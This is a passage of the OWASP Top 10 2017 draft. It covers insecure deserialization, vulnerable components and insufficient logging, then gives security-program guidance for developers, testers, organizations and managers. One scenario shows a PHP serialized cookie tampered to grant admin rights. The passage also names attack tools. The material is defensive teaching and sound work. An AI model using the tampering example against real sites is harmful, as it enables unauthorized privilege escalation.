<td style="text-align: left;">This issue is included in the Top 10 based on an <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">industry survey</a> and not on quantifiable data. Some tools can discover deserialization flaws, but human assistance is frequently needed to validate the problem. It is expected that prevalence data for deserialization flaws will increase as tooling is developed to help identify and address it. </td>
<td style="text-align: left;">The impact of deserialization flaws cannot be understated. They can lead to remote code execution attacks, one of the most serious attacks possible.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-insecure-deserialization">Am I Vulnerable to Insecure Deserialization?</h2>
<p>Distributed applications or those that need to store state on clients or the filesystem may be using object serialization. Distributed applications with public listeners or applications that rely on the client maintaining state, are likely to allow for tampering of serialized data. This attack is possible with binary formats like Java Serialization or text based formats like Json.Net. Applications and APIs will be vulnerable if the when:</p>
<ul>
<li>The serialization mechanism allows for the creation of arbitrary data types, AND</li>
<li>There are classes available to the application that can be chained together to change application behavior during or after deserialization, or unintended content can be used to influence application behavior, AND</li>
<li>The application or API accepts and deserializes hostile objects supplied by an attacker, or an application uses serialized opaque client side state without appropriate tamper resistant controls. OR</li>
<li>Security state sent to an untrusted client without some form of integrity control is likely vulnerable to deserialization.</li>
</ul>
<h2 id="how-do-i-prevent-this-6">How Do I Prevent This?</h2>
<p>The only safe architectural pattern is to not accept serialized objects from untrusted sources or to use serialization mediums that only permit primitive data types.</p>
<p>If that is not possible:</p>
<ul>
<li>Implement integrity checks or encryption of the serialized objects to prevent hostile object creation or data tampering.</li>
<li>Enforce strict type constraints during deserialization before object creation; typically code is expecting a definable set of classes. Bypasses to this technique have been demonstrated.</li>
<li>Isolate code that deserializes, such that it runs in very low privilege environments, such as temporary containers.</li>
<li>Log deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.</li>
<li>Restrict or monitor incoming and outgoing network connectivity from containers or servers that deserialize.</li>
<li>Monitor deserialization, alerting if a user deserializes constantly.</li>
</ul>
<h2 id="example-attack-scenarios-6">Example Attack Scenarios​</h2>
<p><strong>Scenario #1</strong>: A React app calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is immutable. The solution they came up with is serializing user state and passing it back and forth with each request. An attacker notices the &quot;R00&quot; Java object signature, and uses the Java Serial Killer tool to gain remote code execution on the application server.</p>
<p><strong>Scenario #2</strong>: A PHP forum uses PHP object serialization to save a &quot;super&quot; cookie, containing the user's user ID, role, password hash, and other state:</p>
<p><code>a:4:{i:0;i:132;i:1;s:7:&quot;Mallory&quot;;i:2;s:4:&quot;user&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;}</code></p>
<p>An attacker changes the serialized object to give themselves admin privileges:</p>
<p><code>a:4:{i:0;i:1;i:1;s:5:&quot;Alice&quot;;i:2;s:5:&quot;admin&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;}</code></p>
<h2 id="references-8">References</h2>
<h3 id="owasp-7">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/Deserialization_Cheat_Sheet">OWASP Deserialization Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#4:_Validate_All_Inputs">OWASP Proactive Controls - Validate All Inputs</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard - TBA</a></li>
<li><a href="https://www.slideshare.net/cschneider4711/surviving-the-java-deserialization-apocalypse-owasp-appseceu-2016">OWASP AppSecEU 2016: Surviving the Java Deserialization Apocalypse</a></li>
</ul>
<h3 id="external-8">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502 Deserialization of Untrusted Data</a></li>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf" class="uri">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li>
<li><a href="https://github.com/mbechler/marshalsec" class="uri">https://github.com/mbechler/marshalsec</a></li>
</ul>
<h1 id="a92017-using-components-with-known-vulnerabilities">A9:2017 Using Components with Known Vulnerabilities</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 2</td>
<td style="text-align: left;">Prevalence 3 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">While it is easy to find already-written exploits for many known vulnerabilities, other vulnerabilities require concentrated effort to develop a custom exploit.</td>
<td style="text-align: left;">Prevalence of this issue is very widespread. Component-heavy development patterns can lead to development teams not even understanding which components they use in their application or API, much less keeping them up to date. This issue is detectable by the use of scanners such as retire.js and header inspection, but verifying if it is exploitable requires an attack of some description.</td>
<td style="text-align: left;">While some known vulnerabilities lead to only minor impacts, some of the largest breaches to date have relied on exploiting known vulnerabilities in components. Depending on the assets you are protecting, perhaps this risk should be at the top of your list.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-known-vulnerabilities">Am I Vulnerable to Known Vulnerabilities?</h2>
<p>You are likely vulnerable:</p>
<ul>
<li>If you do not know the versions of all components you use (both client-side and server-side). This includes components you directly use as well as nested dependencies.</li>
<li>If any of your software out of date? This includes the OS, Web/App Server, DBMS, applications, APIs and all components, runtime environments and libraries.</li>
<li>If you do not know if they are vulnerable. Either if you don’t research for this information or if you don’t scan them for vulnerabilities on a regular base.</li>
<li>If you do not fix nor upgrade the underlying platform, frameworks and dependencies in a timely fashion. This commonly happens is environments when patching is a monthly or quarterly task under change control, which leaves organizations open to many days or months of unnecessary exposure to fixed vulnerabilities. This is likely the root cause of one of the largest breaches of all time. </li>
<li>If you do not secure the components' configurations (see A6:2017-Security Misconfiguration).</li>
</ul>
<h2 id="how-do-i-prevent-this-7">How Do I Prevent This?</h2>
<p>Software projects should have a process in place to:</p>
<ul>
<li>Remove unused dependencies, unnecessary features, components, files, and documentation</li>
<li>Continuously inventory the versions of both client-side and server-side components and their dependencies using tools like <a href="http://www.mojohaus.org/versions-maven-plugin/">versions</a>, <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">DependencyCheck</a>, <a href="https://github.com/retirejs/retire.js/">retire.js</a>, etc.</li>
<li>Continuously monitor sources like <a href="https://cve.mitre.org/">CVE</a> and <a href="https://nvd.nist.gov/">NVD</a> for vulnerabilities in your components. Use software composition analysis tools to automate the process.</li>
<li>Only obtain your components from official sources and, when possible, prefer signed packages to reduce the chance of getting a modified, malicious component.</li>
<li>Many libraries and components do not create security patches for out of support or old versions, or it simply be unmaintained. If patching is not possible, consider deploying a <a href="https://www.owasp.org/index.php/Virtual_Patching_Best_Practices#What_is_a_Virtual_Patch.3F">virtual patch</a> to monitor, detect or protect against the discovered issue.</li>
</ul>
<p>Every organization must ensure that there is an ongoing plan for monitoring, triaging, and applying updates or configuration changes for the lifetime of the application or portfolio.</p>
<h2 id="example-attack-scenarios-7">Example Attack Scenarios</h2>
<p>Components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact. Such flaws can be accidental (e.g. coding error) or intentional (e.g. backdoor in component). Some example exploitable component vulnerabilities discovered are:</p>
<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>, a Struts 2 remote code execution vulnerability that enables execution of arbitrary code on the server, has been blamed for significant breaches.</li>
<li>While <a href="https://en.wikipedia.org/wiki/Internet_of_things">internet of things (IoT)</a> are frequently difficult or impossible to patch, the importance of patching them can be great (eg: <a href="(http://www.zdnet.com/article/fda-forces-st-jude-pacemaker-recall-to-patch-security-vulnerabilities/)">St. Jude pacemakers</a>.</li>
</ul>
<p>There are automated tools to help attackers find unpatched or misconfigured systems. For example, the <a href="https://www.shodan.io/report/89bnfUyJ">Shodan IoT search engine</a> can help you find devices that still suffer from the <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a> vulnerability that was patched in April 2014.</p>
<h2 id="references-9">References</h2>
<h3 id="owasp-8">OWASP</h3>
<ul>
<li><a href="">OWASP Proactive Controls - TBA</a></li>
<li><a href="">OWASP Application Security Verification Standard - TBA</a></li>
<li><a href="">OWASP Testing Guide - TBA</a></li>
<li><a href="">OWASP Cheat Sheet - TBA</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">OWASP Dependency Check (for Java and .NET libraries)</a></li>
<li><a href="https://www.owasp.org/index.php/Virtual_Patching_Best_Practices">OWASP Virtual Patching Best Practices</a></li>
</ul>
<h3 id="external-9">External</h3>
<ul>
<li><a href="https://www.aspectsecurity.com/research-presentations/the-unfortunate-reality-of-insecure-libraries">The Unfortunate Reality of Insecure Libraries</a></li>
<li><a href="https://www.cvedetails.com/version-search.php">MITRE Common Vulnerabilities and Exposures (CVE) search</a></li>
<li><a href="https://nvd.nist.gov/">National Vulnerability Database (NVD)</a></li>
<li><a href="https://github.com/retirejs/retire.js/">Retire.js for detecting known vulnerable JavaScript libraries</a></li>
<li><a href="https://nodesecurity.io/advisories">Node Libraries Security Advisories</a></li>
<li><a href="https://rubysec.com/">Ruby Libraries Security Advisory Database and Tools</a></li>
<li><a href="https://snyk.io/vuln">Snyk: Node/JS, Ruby, Java and Python Vulnerability Database and Tool</a></li>
</ul>
<h1 id="a102017-insufficient-logging-detection-and-active-response">A10:2017 Insufficient Logging, Detection and Active Response</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 2</td>
<td style="text-align: left;">Prevalence 3 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">Exploitation of insufficient logging and monitoring is the bedrock of nearly every major incident. Attackers rely on the lack of monitoring and timely response to achieve their goals without being detected.</td>
<td style="text-align: left;">This issue is included in the Top 10 based on an <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">industry survey</a>. One strategy for determining if you have sufficient monitoring is to examine your logs following penetration testing. The testers actions should be recorded sufficiently to understand what damages they may have inflicted.</td>
<td style="text-align: left;">Most successful attacks start with vulnerability probing. Allowing such probes to continue can raise the likelihood of successful exploit to nearly 100%.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-insufficient-logging-monitoring">Am I Vulnerable to Insufficient Logging &amp; Monitoring?</h2>
<p>Insufficient logging, detection, monitoring and active response occurs any time:</p>
<ul>
<li>Auditable events, such as logins, failed logins, and high value transactions are not logged.</li>
<li>Logs of applications and APIs are not monitored for suspicious activity.</li>
<li>Alerting thresholds and response escalation as per the risk of the data held by the application is not in place or effective.</li>
</ul>
<p>For larger and high performing organizations, the lack of active response, such as real time alerting and response activities such as blocking automated attacks on web apps and particularly APIs would place the organization at risk from extended compromise. The response does not necessarily need to be visible to the attacker, only that the application and associated infrastructure, frameworks, service layers, etc. can detect and alert humans or tools to respond in near real time.</p>
<h2 id="how-do-i-prevent-this-8">How Do I Prevent This?</h2>
<p>As per the risk of the data stored or processed by the application:</p>
<ul>
<li>Ensure all login, access control failures, input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts, and held for sufficient time to allow delayed forensic analysis.</li>
<li>Ensure high value transactions have an audit trail with integrity controls to prevent tampering or deletion, such as append only database tables or similar.</li>
<li>Establish effective monitoring and alerting such that suspicious activities are detected and responded within acceptable time periods.</li>
<li>Establish or adopt an incident response and recovery plan, such as <a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a> or later.</li>
</ul>
<p>There are commercial and open source application protection frameworks such as <a href="https://www.owasp.org/index.php/OWASP_AppSensor_Project">OWASP AppSensor</a>, web application firewalls such as <a href="https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project">mod_security with the OWASP Core Rule Set</a>, and log correlation software such as <a href="https://www.elastic.co/products">ELK</a> with custom dashboards and alerting. Penetration testing and scans by DAST tools (such as OWASP ZAP) should always trigger alerts.</p>
<h2 id="example-attack-scenarios-8">Example Attack Scenarios</h2>
<p><strong>Scenario 1</strong>: An open source project forum software run by a small team was hacked using a flaw in its software. The attackers managed to wipe out the internal source code repository containing the next version, and all of the forum contents. Although source could be recovered, the lack of monitoring, logging or alerting led to a far worse breach. The forum software project is no longer active as a result of this issue.</p>
<p><strong>Scenario 2</strong>: An attacker uses scans for users using a common password. He can take over all accounts using this password. For all other users this scan leaves only 1 false login behind. After some days this may be repeated with a different password.</p>
<p><strong>Scenario 3</strong>: A major US retailer reportedly had an internal malware analysis sandbox analyzing attachments. The sandbox software had detected potentially unwanted software, but no one responded to this detection. The sandbox had been producing warnings for some time before the breach was detected due to fraudulent card transactions by an external bank.</p>
<h2 id="references-10">References</h2>
<h3 id="owasp-9">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#8:_Implement_Logging_and_Intrusion_Detection">OWASP Proactive Controls - Implement Logging and Intrusion Detection</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard - V7 Logging and Monitoring</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Testing Guide - Testing for Detailed Error Code</a></li>
<li><a href="https://www.owasp.org/index.php/Logging_Cheat_Sheet">OWASP Cheat Sheet - Logging</a></li>
</ul>
<h3 id="external-10">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223 Omission of Security-relevant Information</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/778.html">CWE-778 Insufficient Logging</a></li>
</ul>
<h1 id="d-whats-next-for-developers">+D What's Next for Developers</h1>
<h2 id="establish-use-repeatable-security-processes-and-standard-security-controls">Establish &amp; Use Repeatable Security Processes and Standard Security Controls</h2>
<p>Whether you are new to web application security or are already very familiar with these risks, the task of producing a secure web application or fixing an existing one can be difficult. If you have to manage a large application portfolio, this task can be daunting.</p>
<p>To help organizations and developers reduce their application security risks in a cost effective manner, OWASP has produced numerous free and open resources that you can use to address application security in your organization. The following are some of the many resources OWASP has produced to help organizations produce secure web applications and APIs. On the next page, we present additional OWASP resources that can assist organizations in verifying the security of their applications and APIs.</p>
<table style="width:11%;">
<colgroup>
<col style="width: 5%" />
<col style="width: 5%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Activity</th>
<th style="text-align: left;">Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Application Security Requirements</td>
<td style="text-align: left;">To produce a secure web application, you must define what secure means for that application. OWASP recommends you use the <a href="https://www.owasp.org/index.php/ASVS">OWASP Application Security Verification Standard (ASVS)</a>, as a guide for setting the security requirements for your application(s). If you’re outsourcing, consider the <a href="https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex">OWASP Secure Software Contract Annex</a>. <strong>NB</strong>: The annex is for US contract law, so please consult qualified legal advice before using the sample annex.</td>
</tr>
<tr class="even">
<td style="text-align: left;">Application Security Architecture</td>
<td style="text-align: left;">Rather than retrofitting security into your applications and APIs, it is far more cost effective to design the security in from the start. OWASP recommends the <a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series">OWASP Prevention Cheat Sheets</a> and the <a href="https://www.owasp.org/index.php/OWASP_Guide_Project">OWASP Developer’s Guide</a> as good starting points for guidance on how to design security in from the beginning. The Cheat Sheets have been updated and expanded significantly since the 2013 Top 10 was released.</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Security Standard Controls</td>
<td style="text-align: left;">Building strong and usable security controls is difficult. Using a set of standard security controls radically simplifies the development of secure applications and APIs. Many popular frameworks come with standard security controls for authorization, validation, CSRF, etc.</td>
</tr>
<tr class="even">
<td style="text-align: left;">Secure Development Lifecycle</td>
<td style="text-align: left;">To improve the process your organization follows when building applications and APIs, OWASP recommends the <a href="https://www.owasp.org/index.php/OWASP_SAMM_Project">OWASP Software Assurance Maturity Model (SAMM)</a>. This model helps organizations formulate and implement a strategy for software security that is tailored to the specific risks facing their organization.</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Application Security Education</td>
<td style="text-align: left;">The <a href="https://www.owasp.org/index.php/Category:OWASP_Education_Project">OWASP Education Project</a> provides training materials to help educate developers on web application security. For hands-on learning about vulnerabilities, try <a href="https://www.owasp.org/index.php/WebGoat">OWASP WebGoat</a>, <a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat.NET">WebGoat.NET</a>, <a href="https://www.owasp.org/index.php/OWASP_Node_js_Goat_Project">OWASP NodeJS Goat</a>), <a href="https://www.owasp.org/index.php/OWASP_Juice_Shop_Project">OWASP Juice Shop Project</a> or the <a href="https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project">OWASP Broken Web Applications Project</a>. To stay current, come to an <a href="https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference">OWASP AppSec Conference</a>, <a href="https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference">OWASP Conference Training</a>, or local <a href="https://www.owasp.org/index.php/Category:OWASP_Chapter">OWASP Chapter meetings</a> meetings.</td>
</tr>
</tbody>
</table>
<p>There are numerous additional OWASP resources available for your use. Please visit the <a href="https://www.owasp.org/index.php/Projects">OWASP Projects</a> page, which lists all the Flagship, Labs, and Incubator projects in the OWASP project inventory. Most OWASP resources are available on our <a href="https://www.owasp.org/">wiki</a>, and many OWASP documents can be ordered in <a href="https://stores.lulu.com/owasp">hardcopy or as eBooks</a>.</p>
<h1 id="t-whats-next-for-security-testing">+T What's Next for Security Testing</h1>
<h2 id="establish-continuous-application-security-testing">Establish Continuous Application Security Testing</h2>
<p>Building code securely is important. But it’s critical to verify that the security you intended to build is actually present, correctly implemented, and used everywhere it was supposed to be. The goal of application security testing is to provide this evidence. The work is difficult and complex, and modern high-speed development processes like Agile and DevOps have put extreme pressure on traditional approaches and tools. So we strongly encourage you to put some thought into how you are going to focus on what’s important across your entire application portfolio, and do it cost-effectively.</p>
<p>Modern risks move quickly, so the days of scanning or penetration testing an application for vulnerabilities once every year or so are long gone. Modern software development requires continuous application security testing across the entire software development lifecycle. Look to enhance existing development pipelines with security automation that doesn’t slow development. Whatever approach you choose, consider the annual cost to test, triage, remediate, retest, and redeploy a single application, multiplied by the size of your application portfolio.</p>
<table style="width:11%;">
<colgroup>
<col style="width: 5%" />
<col style="width: 5%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Activity</th>
<th style="text-align: left;">Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Understand the Threat Model</td>
<td style="text-align: left;">Before you start testing, be sure you understand what’s important to spend time on. Priorities come from the threat model, so if you don’t have one, you need to create one before testing. Consider using <a href="https://www.owasp.org/index.php/ASVS">OWASP ASVS</a> and the <a href="https://www.owasp.org/index.php/OWASP_Testing_Project">OWASP Testing Guide</a> as an input and don’t rely on tool vendors to decide what’s important for your business.</td>
</tr>
<tr class="even">
<td style="text-align: left;">Understand Your SDLC</td>
<td style="text-align: left;">Your approach to application security testing must be highly compatible with the people, processes, and tools you use in your software development lifecycle (SDLC). Attempts to force extra steps, gates, and reviews are likely to cause friction, get bypassed, and struggle to scale. Look for natural opportunities to gather security information and feed it back into your process.</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Testing Strategies</td>
<td style="text-align: left;">Choose the simplest, fastest, most accurate technique to verify each requirement. The <a href="https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework">OWASP Security Knowledge Framework</a> and <a href="https://www.owasp.org/index.php/ASVS">OWASP Application Security Verification Standard</a> can be great sources of functional and non-functional security requirements in your unit and integration testing. Be sure to consider the human resources required to deal with false positives from the use of automated tooling, as well as the serious dangers of false negatives.</td>
</tr>
<tr class="even">
<td style="text-align: left;">Making Findings Awesome</td>
<td style="text-align: left;">No matter how good you are at testing, it won’t make any difference unless you communicate it effectively. Build trust by showing you understand how the application works. Describe clearly how it can be abused without “lingo” and include an attack scenario to make it real. Make a realistic estimation of how hard the vulnerability is to discover and exploit, and how bad that would be. Finally, deliver findings in the tools development teams are already using, not PDF files.</td>
</tr>
</tbody>
</table>
<h1 id="o-whats-next-for-organizations">+O What's Next for Organizations</h1>
<h2 id="start-your-application-security-program-now">Start Your Application Security Program Now</h2>
<p>Application security is no longer optional. Between increasing attacks and regulatory pressures, organizations must establish effective processes and capabilities for securing their applications and APIs. Given the staggering amount of code in the numerous applications and APIs already in production, many organizations are struggling to get a handle on the enormous volume of vulnerabilities.</p>
<p>OWASP recommends organizations establish an application security program to gain insight and improve security across their app and API portfolio. Achieving application security requires many different parts of an organization to work together efficiently, including security and audit, software development, business, and executive management. Security should be visible and measurable, so that all the different players can see and understand the organization’s application security posture. Focus on the activities and outcomes that actually help improve enterprise security by eliminating or reducing risk. Key activities include:</p>
<h3 id="get-started">Get Started</h3>
<ul>
<li>Document all applications and associated data assets in a Configuration Management Database (CMDB).</li>
<li>Establish an <a href="https://www.owasp.org/index.php/SAMM_-_Strategy_&amp;_Metrics_-_1">application security program</a> and drive adoption.</li>
<li>Conduct a <a href="https://www.owasp.org/index.php/SAMM_-_Strategy_&amp;_Metrics_-_3">capability gap analysis</a> comparing your organization to your peers to define key improvement areas and an execution plan.</li>
<li>Gain management approval and establish an <a href="https://www.owasp.org/index.php/SAMM_-_Education_&amp;_Guidance_-_1">application security awareness campaign</a> for the entireIT organization.</li>
</ul>
<h3 id="risk-based-portfolio-approach">Risk Based Portfolio Approach</h3>
<ul>
<li>Identify the <a href="https://www.owasp.org/index.php/SAMM_-_Strategy_&amp;_Metrics_-_2">protection needs</a> of your <a href="https://www.owasp.org/index.php/SAMM_-_Strategy_&amp;_Metrics_-_2">application portfolio</a> from a business perspective. This should be driven in part by privacy laws and other regulations relevant to the data asset being protected.</li>
<li>Establish a common <a href="https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology">risk rating model</a> with a consistent set of likelihood and impact factors reflective of your organization's tolerance for risk.</li>
<li>Accordingly measure and prioritize all your applications and APIs. Add the results to your CMDB.</li>
<li>Establish assurance guidelines to properly define coverage and level of rigor required.</li>
</ul>
<h3 id="enable-with-a-strong-foundation">Enable with a Strong Foundation</h3>
<ul>
<li>Establish a set of focused <a href="https://www.owasp.org/index.php/SAMM_-_Policy_&amp;_Compliance_-_2">policies and standards</a> that provide an application security baseline for all development teams to adhere to.</li>
<li>Define a common set of <a href="https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework">reusable security controls</a> that complement these policies and standards and provide design and development guidance on their use.</li>
<li>Establish an <a href="https://www.owasp.org/index.php/SAMM_-_Education_&amp;_Guidance_-_2">application security training curriculum</a> that is required and targeted to different development roles and topics.</li>
</ul>
<h3 id="integrate-security-into-existing-processes">Integrate Security into Existing Processes</h3>
<ul>
<li>Define and integrate <a href="https://www.owasp.org/index.php/SAMM_-_Construction">secure implementation</a> and <a href="https://www.owasp.org/index.php/SAMM_-_Verification">verification</a> activities into existing development and operational processes. Activities include <a href="https://www.owasp.org/index.php/SAMM_-_Threat_Assessment_-_1">threat modeling</a>, secure <a href="https://www.owasp.org/index.php/SAMM_-_Design_Review_-_1">design &amp; review</a>, secure coding and <a href="https://www.owasp.org/index.php/SAMM_-_Code_Review_-_1">code review</a>, <a href="https://www.owasp.org/index.php/SAMM_-_Security_Testing_-_1">penetration testing</a>, and remediation.</li>
<li>Provide subject matter experts and <a href="https://www.owasp.org/index.php/SAMM_-_Education_&amp;_Guidance_-_3">support services for development and project teams</a> to be successful.</li>
</ul>
<h3 id="provide-management-visibility">Provide Management Visibility</h3>
<ul>
<li>Manage with metrics. Drive improvement and funding decisions based on the metrics and analysis data captured. Metrics include adherence to security practices / activities, vulnerabilities introduced, vulnerabilities mitigated, application coverage, defect density by type and instance counts, etc.</li>
<li>Analyze data from the implementation and verification activities to look for root cause and vulnerability patterns to drive strategic and systemic improvements across the enterprise. Learn from mistakes and offer positive incentives to promote improvements.</li>
</ul>
<h3 id="examples-of-such-programs">Examples of such programs</h3>
<ul>
<li>US Department of Veteran's Affairs <a href="https://wiki.mobilehealth.va.gov/display/OISSWA/OIS+Software+Assurance">OIS Software Assurance</a></li>
</ul>
<h1 id="a-whats-next-for-application-managers">+A: What's next for Application Managers</h1>
<h2 id="manage-the-full-application-lifecycle">Manage the full Application Lifecycle</h2>
<p>Applications are some of the most complex systems humans regularly create and maintain. IT management for an application should be performed by IT specialists who are responsible for the overall IT lifecycle of an application. </p>
<p>We suggest establishing application owners and application managers for every application to provide accountability, responsibility, consulted and informed (RACI). The application manager is the technical counterpart of the application owner from business perspective and manages the full application lifecycle, including the security of an application, associate data assets, and documentation. This can help with understanding who can sign off risks, who is responsible for including security.</p>
<h2 id="requirements-and-resource-management">Requirements and Resource Management</h2>
<ul>
<li>Collect and negotiate the business requirements for an application with the business, including receiving the protection requirements in regard to confidentiality, integrity and availability of all data assets</li>
<li>Compile the technical requirements including functional and non functional security requirements</li>
<li>Plan and negotiate the budget that covers all aspects of design, build, testing and operation, including security activities</li>
</ul>
<h2 id="request-for-proposals-rfp-and-contracting">Request for Proposals (RFP) and Contracting</h2>
<ul>
<li>Negotiate with internal or external developers the requirements, including guidelines and security requirements with respect to your security program, e.g. SDLC, best practices</li>
<li>Rate the fulfillment of all technical requirements including a rough planning and design</li>
<li>Negotiate all technical requirements including design, security and service level agreements (SLA)</li>
<li>Consider adopting templates and checklists, such as <a href="https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex">OWASP Secure Software Contract Annex</a> <strong>NB</strong>: The Annex is a sample specific to US contract law, and is likely to need legal review in your jurisdiction. Please consult qualified legal advice before using the Annex.</li>
</ul>
<h2 id="planning-and-design">Planning and Design</h2>
<ul>
<li>Negotiate planning and design with the developers and internal shareholders, e.g. security specialists</li>
<li>Define a security architecture, controls, and countermeasures according the protection needs and the planned environmental security level. This should be supported by security specialists.</li>
<li>Get the application owner to assume remaining risks or to provide additional resources.</li>
<li>Each sprint, ensure security stories are created for functional requirements, and constraints added for non-functional requirements</li>
</ul>
<h2 id="development">Development</h2>
<ul>
<li>Please review the +D &quot;What's next for developers&quot; for guidance.</li>
</ul>
<h2 id="deployment-testing-and-rollout">Deployment, Testing and Rollout</h2>
<ul>
<li>It's critical that security tasks automated the secure setup of the application, interfaces and of all further components needed, including required authorizations</li>
<li>Test the technical functions and integration to the IT architecture, and coordinate business tests. Consider to test use and abuse cases from technical and business perspectives.</li>
<li>Manage security tests according to internal processes, the protection needs and the level of security where the application is going to be deployed</li>
<li>Put the application in operation and migrate from previously used applications</li>
<li>Finalize all documentation, including the CMDB and security architecture</li>
</ul>
<h2 id="operating-and-changes">Operating and Changes</h2>
<ul>
<li>Operating including the security management for the application (e.g. patch management)</li>
<li>Regularly report all users and authorizations to the application owner and get them acknowledged</li>
<li>Raise the security awareness of users and manage conflicts about usability vs security</li>
<li>Plan and manage changes, e.g. migrate to new versions of the application or other components like OS, middleware and libraries</li>
<li>Update all documentation, including in CMDB and the security architecture, controls, and countermeasures, including any runbooks or project documentation</li>
</ul>
<h2 id="retiring-systems">Retiring Systems</h2>
<ul>
<li>Implement business requirements for data retention (deletion) policies and securely archiving data</li>
<li>Securely close down the application, including deleting unused accounts and roles and permissions</li>
<li>Set your application’s state to retired in the CMDB</li>
</ul>
<h1 id="r-note-about-risks">+R Note About Risks</h1>
<h2 id="its-about-risks-not-weaknesses">It’s About Risks, Not Weaknesses</h2>
<p>Although the <a href="https://www.owasp.org/index.php/Top10">OWASP Top 10 2007</a> and earlier versions of the Top 10 focused on identifying the most prevalent “vulnerabilities,” the OWASP Top 10 has always been organized around risks. This focus on risks has caused some understandable confusion on the part of people searching for an airtight weakness taxonomy. The <a href="https://www.owasp.org/index.php/Top_10_2010">OWASP Top 10 for 2010</a> clarified the risk-focus in the Top 10 by being very explicit about how threat agents, attack vectors, weaknesses, technical impacts, and business impacts combine to produce risks. This version of the OWASP Top 10 continues to follow the same methodology.</p>
<p>The Risk Rating methodology for the Top 10 is based on the <a href="https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology">OWASP Risk Rating Methodology</a>. For each Top 10 item, we estimated the typical risk that each weakness introduces to a typical web application by looking at common likelihood factors and impact factors for each common weakness. We then rank ordered the Top 10 according to those weaknesses that typically introduce the most significant risk to an application. These factors get updated with each new Top 10 release as things change.</p>
<p>The <a href="https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology">OWASP Risk Rating Methodology</a> defines numerous factors to help calculate the risk of an identified vulnerability. However, the Top 10 must talk about generalities, rather than specific vulnerabilities in real applications and APIs. Consequently, we can never be as precise as system owners can be when calculating risks for their application(s). You are best equipped to judge the importance of your applications and data, what your threats are, and how your system has been built and is being operated.</p>
<p>Our methodology includes three likelihood factors for each weakness (prevalence, detectability, and ease of exploit) and one impact factor (technical impact). The prevalence of a weakness is a factor that you typically don’t have to calculate. For prevalence data, we have been supplied prevalence statistics from a number of different organizations (as referenced in the Attribution section on page 4) and we have averaged their data together to come up with a Top 10 likelihood of existence list by prevalence. This data was then combined with the other two likelihood factors (detectability and ease of exploit) to calculate a likelihood rating for each weakness. The likelihood rating was then multiplied by our estimated average technical impact for each item to come up with an overall risk ranking for each item in the Top 10 (the higher the result the higher the risk).  </p>
